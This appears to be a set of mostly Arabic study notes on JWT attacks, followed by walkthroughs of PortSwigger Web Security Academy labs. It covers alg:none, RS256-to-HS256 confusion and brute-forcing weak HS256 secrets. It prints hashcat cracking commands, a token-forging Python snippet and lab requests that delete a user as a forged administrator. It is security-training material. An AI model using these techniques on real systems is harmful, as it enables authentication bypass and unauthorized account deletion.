# JWT


- <details>
    <summary>what is JWT?</summary>
  
  # 🔐 JWT Attacks - مقدمة
  
  ## ما هو JWT؟
  
  -   **JWT = JSON Web Token** → معيار لتمثيل البيانات كـ JSON بين
      الأنظمة.
  -   غالبًا يُستخدم في:
      -   **Authentication** (تأكيد هوية المستخدم)
      -   **Session management** (إدارة الجلسات)
      -   **Access control** (تحديد الصلاحيات)
  
  ------------------------------------------------------------------------
  
  ## بنية JWT
  
  يتكون JWT من **3 أجزاء** مفصولة بنقطة `.`:
  
  1.  **Header** → معلومات عن التوكن (الخوارزمية، النوع).
  2.  **Payload** → البيانات (claims) مثل اسم المستخدم والصلاحيات.
  3.  **Signature** → توقيع يعتمد على مفتاح سري للتحقق من عدم التلاعب.
  
  مثال:
  
      xxxxx.yyyyy.zzzzz
  
  ------------------------------------------------------------------------
  
  ## مثال عملي - Payload
  
  ``` json
  {
      "iss": "portswigger",
      "exp": 1648037164,
      "name": "Carlos Montoya",
      "sub": "carlos",
      "role": "blog_author",
      "email": "carlos@carlos-montoya.net",
      "iat": 1516239022
  }
  ```
  
  ### ملاحظات:
  
  -   **Readable**: أي شخص يقدر يفك البيانات لأنها Base64Url (ليست مشفرة).
  -   **Integrity**: التوقيع هو اللي يمنع التلاعب بالبيانات.
  
  ------------------------------------------------------------------------
  
  ## دور الـ Signature
  
  -   التوقيع يتكون من:
  
          HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), secret )
  
  -   عند استلام التوكن، السيرفر يتحقق من صحة التوقيع.
  
  -   أي تعديل في **Header** أو **Payload** يجعل التوقيع غير صالح.
  
  ------------------------------------------------------------------------
  
  ## نصائح عملية
  
  -   جرب على [jwt.io](https://jwt.io) → فك التوكن وشوف التغيير في
      التوقيع.
  -   استخدم أدوات مثل **Burp Suite** أو **jwt_tool** لاختبار ثغرات JWT.
  
  ------------------------------------------------------------------------
  
    
  </details>




- <details>
     <summary>JWT attacks</summary>

  
  # JWT Attacks Notes
  
  ## 1. JWT vs JWS vs JWE
  
  -   **JWT (JSON Web Token)**: مجرد Format قياسي للـ Tokens. ممكن يكون
      Signed أو Encrypted.
  -   **JWS (JSON Web Signature)**: JWT معمول له **توقيع** (Signature)
      باستخدام خوارزمية زي HS256 أو RS256 عشان يضمن سلامة البيانات.
  -   **JWE (JSON Web Encryption)**: JWT معمول له **تشفير** كامل عشان يحمي
      المحتوى من إنه يتشاف.
  
  ------------------------------------------------------------------------
  
  ## 2. كيف تظهر ثغرات JWT؟
  
  -   **ضعف في التحقق من التوقيع**:\
      مثال: السيرفر يقبل الـ "alg": "none" → يعني يعتبر الـ Token صالح من
      غير أي توقيع.
  
  -   **ضعف في اختيار الخوارزمية**:\
      مثلًا السيرفر متوقع RS256 (مفتاح عام/خاص) لكن يسمح بالتحويل إلى
      HS256 باستخدام المفتاح العام كـ secret.
  
  -   **تسريب الـ Secret**:\
      لو الـ Secret ضعيف أو متسرب، المهاجم يقدر يولّد توكنات صحيحة.
  
  -   **عدم التحقق من الـ Claims**:
  
      -   تجاهل الـ `exp` → التوكن يفضل صالح بعد انتهاء صلاحيته.
      -   تجاهل الـ `aud` → المهاجم ممكن يستخدم التوكن في تطبيق مختلف.
  
  ------------------------------------------------------------------------
  
  ## 3. Impact (التأثير)
  
  -   انتحال هوية المستخدمين (Authentication Bypass).
  -   سرقة صلاحيات (Privilege Escalation).
  -   وصول إلى بيانات أو عمليات محمية.
  
  ------------------------------------------------------------------------
  
  ## 4. مثال على JWT
  
  Header:
  
  ``` json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```
  
  Payload:
  
  ``` json
  {
    "sub": "1234567890",
    "name": "Alice",
    "admin": true,
    "exp": 1724252214
  }
  ```
  
  Signature:
  
      HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
  
  ------------------------------------------------------------------------
  
  ## 5. أمثلة على الهجوم
  
  ### 5.1 Algorithm None Attack
  
  ``` json
  {
    "alg": "none",
    "typ": "JWT"
  }
  ```
  
  → السيرفر يقبل التوكن بدون توقيع.
  
  ### 5.2 RS256 to HS256 Attack
  
  -   السيرفر متوقع RS256 (مفتاح عام/خاص).\
  -   المهاجم يغيرها إلى HS256 ويستخدم المفتاح **العام** كـ secret لتوليد
      توقيع صحيح.
  
  ------------------------------------------------------------------------
  
  # ✅ الخلاصة
  
  -   دايمًا تحقق من صحة الخوارزمية.
  -   لا تستخدم `none` algorithm.
  -   استخدم Secrets قوية أو مفاتيح صحيحة.
  -   راقب وصحّح Claims زي `exp`, `aud`, `iss`.
  
  

  </details>




- <details>
    <summary>JWT Attacks - Brute-forcing Secret Keys</summary>
    
    # JWT Attacks - Brute-forcing Secret Keys
    
    ## الفكرة الأساسية
    - بعض خوارزميات التوقيع مثل **HS256 (HMAC + SHA-256)** تعتمد على **secret key** (سلسلة نصية عشوائية).
    - لو الـ secret ضعيف أو قابل للتخمين (زي كلمة مرور ضعيفة)، المهاجم يقدر يعمل:
      - إنشاء JWT بأي header و payload.
      - إعادة التوقيع باستخدام الـ secret المخمَّن.
      - الحصول على توقيع صحيح وبالتالي تزوير الـ JWT.
    
    ---
    
    ## أخطاء شائعة من المطورين
    - نسيان تغيير الـ default/placeholder secret.
    - نسخ كود من الإنترنت ونسيان تعديل الـ hardcoded secret.
    - استخدام أسرار ضعيفة أو مشهورة.
    
    ---
    
    ## أداة Brute-force: Hashcat
    - **Hashcat** بيستخدم لمهاجمة مفاتيح JWT بسرعة.
    - موجود مسبقًا في **Kali Linux**.
    - لازم يكون عندك:
      - JWT صالح (موقَّع من السيرفر).
      - wordlist فيها أسرار معروفة.
    
    ---
    
    ## الأمر المستخدم
    ```bash
    hashcat -a 0 -m 16500 <jwt> <wordlist>
    ```

    https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
    
    - ``-a 0`` → هجوم dictionary.
    
    - ``-m 16500`` → مود JWT HS256.
    
    - ``<jwt>`` → التوكن الهدف.
    
    - ``<wordlist>`` → قائمة .
    
    
    #### النتيجة
    
    > Hashcat بيجرب كل secret من الـ wordlist.
    
    لو لقى مطابقة، هيطبع بالشكل:
    
    ```ruby
    <jwt>:<identified-secret>
    ```
    
    لو شغلت الأمر أكتر من مرة، لازم تضيف:
    
    ```
    --show
    ```
    
    
    ```
    hashcat -a 0 -m 16500 <jwt> /usr/share/seclists/Passwords/JWT/jwt.secrets.list
    ```
    ---
    
    <details>
    
    ```
    python3 jwt_tool.py <jwt> -S hs256 -k <secret>
    ```
    
    ```python
    import jwt
    
    payload = {"username": "attacker", "role": "admin"}
    secret = "the_secret_you_found"
    
    token = jwt.encode(payload, secret, algorithm="HS256")
    print(token)
    ```
    
    
    
        
    </details>


  </details>




















----



<details>
  <summary>Lab: JWT authentication bypass via unverified signature</summary>


1. login as **`wiener : peter`**

```http
GET /my-account?id=wiener HTTP/2

Host: 0a560020036c2252813698d200c400be.web-security-academy.net

Cookie: session=eyJraWQiOiI4MWIxYTBiYy01NWNlLTRjOTAtYTE1Yi02ZTY0MzM1MTljNTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyMDU2OCwic3ViIjoid2llbmVyIn0.cLk9QduwU-eyT0xFZwd-BmYuNWJbfadMd_vHQ6IROuHznq-A5R4OvFo7VF_AfDKhOvKCLQxRtEYOdJ-1rGZGkMhYQk36FpGH5m2FTAzqZWT5h2fKiGUhYM8s5p3Pms6R6KNf1vFuKT4yJEs0e-EtpseOIMSQ6wFTpItZz6Pv21abFIETe-pq-2fcgFMfyQs5fzwLbc30IwBhOC-0X1_lJuQiRCXM7Yh3_WbTF5Cw68R5UTaKIIl0SbyKd9rrUCs4dHVZJtQhDLVHsiqUHcJZyewV8PIe8TZHH3Zc0jJYdOEqJck_8EP2Jd8Mrsg1dHMTsQHjgVPODAqz4oc5opnYlw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a560020036c2252813698d200c400be.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers



```

### **`JWT`**

```json
eyJraWQiOiI4MWIxYTBiYy01NWNlLTRjOTAtYTE1Yi02ZTY0MzM1MTljNTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyMDU2OCwic3ViIjoid2llbmVyIn0.cLk9QduwU-eyT0xFZwd-BmYuNWJbfadMd_vHQ6IROuHznq-A5R4OvFo7VF_AfDKhOvKCLQxRtEYOdJ-1rGZGkMhYQk36FpGH5m2FTAzqZWT5h2fKiGUhYM8s5p3Pms6R6KNf1vFuKT4yJEs0e-EtpseOIMSQ6wFTpItZz6Pv21abFIETe-pq-2fcgFMfyQs5fzwLbc30IwBhOC-0X1_lJuQiRCXM7Yh3_WbTF5Cw68R5UTaKIIl0SbyKd9rrUCs4dHVZJtQhDLVHsiqUHcJZyewV8PIe8TZHH3Zc0jJYdOEqJck_8EP2Jd8Mrsg1dHMTsQHjgVPODAqz4oc5opnYlw
```

- <details>
      <summary>jwt.io</summary>
 
     <img width="1183" height="326" alt="image" src="https://github.com/user-attachments/assets/48bc8145-7604-4124-987c-5add5170affa" />

  
   </details>


- <details>
      <summary>JWT editor burp</summary>

    <img width="732" height="713" alt="image" src="https://github.com/user-attachments/assets/9e106d7c-2521-4e54-98c5-3a348e5d417e" />

  
   </details>




<img width="741" height="125" alt="image" src="https://github.com/user-attachments/assets/554d6f72-cedc-4ccd-972f-4f2618b5b91c" />

<img width="1526" height="738" alt="image" src="https://github.com/user-attachments/assets/045c7041-0caf-4d5f-8838-4a11d70e3479" />


> change path to **`/admin`**

<img width="1498" height="657" alt="image" src="https://github.com/user-attachments/assets/24d92751-c0cb-4d14-ba46-0e5338441d7d" />

<img width="1356" height="557" alt="image" src="https://github.com/user-attachments/assets/0c504fb1-c66e-4c15-867b-9cf29892604e" />

<img width="1430" height="491" alt="image" src="https://github.com/user-attachments/assets/1e4b1cdc-88ad-4dd8-9c95-0d9023896589" />




  
</details>



<details>
    <summary>Lab: JWT authentication bypass via flawed signature verification</summary>

1. login as **`wiener : peter`**

<img width="747" height="613" alt="image" src="https://github.com/user-attachments/assets/49400493-6f82-4b6d-84ae-7872076d755e" />

> change **`algo`** to `none` and remove the signeture and change **``carlos``** to **``administrator``**

<img width="1505" height="731" alt="image" src="https://github.com/user-attachments/assets/6a59e0d7-bc8b-4d6c-bb91-b314fa9d88d4" />


> now change **`path`** to :

```http
GET /admin/delete?username=carlos HTTP/2
```

<img width="1505" height="734" alt="image" src="https://github.com/user-attachments/assets/4de7a1c3-ea34-4b8a-9a49-40a2b1d2d401" />

    
</details>







<details>
    <summary>Lab: JWT authentication bypass via weak signing key</summary>


```
eyJraWQiOiIwNjhlY2JkYy00YzQ2LTRlOWItODc5Zi02Y2QyZWVhNjNiZDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyNDM0OCwic3ViIjoid2llbmVyIn0.c0YlOr9HLbE0Xuso36umnu2wiOsGd2BzArlCXI3_60M
```

<img width="742" height="614" alt="image" src="https://github.com/user-attachments/assets/45651d25-d4f7-434e-99d5-9667d0c0bcdb" />


```
hashcat -a 0 -m 16500 eyJraWQiOiIwNjhlY2JkYy00YzQ2LTRlOWItODc5Zi02Y2QyZWVhNjNiZDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjQyNDM0OCwic3ViIjoid2llbmVyIn0.c0YlOr9HLbE0Xuso36umnu2wiOsGd2BzArlCXI3_60M /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
```

<img width="1374" height="273" alt="image" src="https://github.com/user-attachments/assets/f9e1cded-604e-47a2-834f-157ba0aba4c7" />

```
secret1
```

<img width="1546" height="745" alt="image" src="https://github.com/user-attachments/assets/09176375-61b2-4e35-9181-8eab68b53d87" />

> now change **`path`** to :

```http
GET /admin/delete?username=carlos HTTP/2
```

<img width="1492" height="649" alt="image" src="https://github.com/user-attachments/assets/87127834-aeb3-4d22-b683-7c305bc7849e" />




    
</details>









































